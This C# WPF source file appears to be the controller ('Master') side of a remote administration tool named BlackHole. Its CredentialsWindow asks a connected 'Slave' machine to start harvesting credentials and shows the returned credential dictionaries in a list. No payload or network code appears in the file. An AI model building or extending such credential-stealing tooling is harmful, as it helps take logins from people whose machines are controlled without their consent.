using System.IO;
using System.Linq;
using System.Windows;
using System.Windows.Media.Imaging;
using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Extentions;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class CredentialsWindow : SlaveWindow
    {
        public CredentialsWindow()
        {
            InitializeComponent();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public CredentialsWindow(Slave slave)
            : base(slave)
        {
            InitializeComponent();
        }

        /// <summary>
        /// 
        /// </summary>
        private void GetCredentials(object sender, RoutedEventArgs routedEventArgs) => 
            Send(new StartCredentialsMessage());

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public override async void OnEvent(SlaveEvent ev)
        {
            base.OnEvent(ev);
            await this.ExecuteInDispatcher(() =>
            {
                switch ((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.IncommingMessage:
                    {
                        ev.Data.Match()
                            .With<CredentialsMessage>(message =>
                            {
                                CredentialsList.ItemsSource = message.Credentials.Select(c => c.Dictionary).ToArray();
                            });
                        break;
                    }
                }
            });
        }
    }
}
